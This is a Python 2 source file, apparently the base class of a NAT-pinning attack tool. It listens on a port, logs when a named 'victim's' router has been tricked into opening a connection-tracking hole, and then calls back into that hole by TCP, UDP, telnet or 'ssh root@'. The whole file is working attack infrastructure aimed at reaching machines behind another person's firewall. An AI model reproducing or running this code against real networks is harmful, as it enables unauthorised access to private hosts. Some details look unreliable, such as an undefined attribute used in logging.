#!/usr/bin/env python
#filename=base.py

from __future__ import with_statement
from threading import Thread
import random
import socket
import time
import contextlib
import exceptions
import subprocess
import asyncore


class Base(asyncore.dispatcher):
	VERBOSE = False
	VICTIMID = ""
	def __init__(self,sType, serverPort,sCallbackType,verbose=False):
		global VERBOSE
		VERBOSE=verbose
		asyncore.dispatcher.__init__(self)
		self.sPort = int(serverPort)
		self.CB_TYPE=sCallbackType #socket, ssh, telnet TODO
		if sType =="TCP" or sType == "UDP": self.pType = sType
        	try:
	        	self.create_socket(socket.AF_INET6, socket.SOCK_STREAM)
			self.set_reuse_addr()
	        except AttributeError:
            		# AttributeError catches Python built without IPv6
            		self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
		except socket.error:
			# socket.error catches OS with IPv6 disabled
			self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
		self.bind(('', self.sPort))
		self.listen(5)
	#end def
	
	def handle_accept(self):
		pair = self.accept()
		if pair is not None:
			conn, addr = pair
			self.protocolhandler(conn,addr)
			
	#end def
	def protocolhandler(self,conn, addr):
		pass
	#end def
	def callback(self,sProto,sType,sIP,iPort,remote_peer):
		global VICTIMID
		if sIP in remote_peer[0]:
			#the fact that the callback ip was translated by the victim's router to reflect the public IP
			# is a dead-sure indication that nat-pinning worked
			#doesn't mean that it's exploitable as their might be infrastructure filtering.
			self.log(" : nf_contrack_" + sProto + " fired on client: " + self.VICTIMID + " ip: "  + sIP)
		if sType == "socket":
			try:
				if ":" in sIP:
					cbsock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
				else:
					cbsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				cbsock.connect((sIP,iPort))
				self.log(sProto + ": Callback success on: " + sIP + " port " +str(iPort),False)
				cbsock.close()
			except socket.error:
				self.log(sProto + ": Callback failed on: " + sIP + " port " +str(iPort),False)
		elif sType=="ssh":
			try:
				launchcmd=["ssh", "root@"+sIP, "-p", str(iPort)]
				p = subprocess.Popen(launchcmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
				status = p.wait()
				self.log(sProto + ": Callback success on: " + sIP + " port " +str(iPort),False)
			except:
				self.log(sProto + ": Callback failed on: " + sIP + " port " +str(iPort),False)
		elif sType=="telnet":
			try:
				launchcmd=["telnet", sIP, str(iPort)]
				p = subprocess.Popen(launchcmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
				status = p.wait()
				self.log(sProto + ": Callback success on: " + sIP + " port " +str(iPort),False)
			except:
				self.log(sProto + ": Callback failed on: " + sIP + " port " +str(iPort),False)
		elif sType=="usocket": #UDP socket
			try:
				if ":" in sIP:
					cbsock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
				else:
					cbsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
				cbsock.sendto("ping\r\n", (sIP,iPort))
				#XXX TODO Of course this doesn't guarantee AT ALL that data was received at other end
				self.log(sProto + ": Callback success on: " + sIP + " port " +str(iPort) + " (UDP)",False)
				cbsock.close()
			except socket.error:
				self.log(sProto + ": Callback failed on: " + sIP + " port " +str(iPort)+ " (UDP)",False)
		else:
			return
	#end def
	def stop(self):
		self.close()
	#end def
	def log(self, str, OnlyVerBose=True):
		if self.TYPE:
			if (OnlyVerBose==False or VERBOSE==True):
	        		print self.TYPE + " - " + str
	#end def
#end class
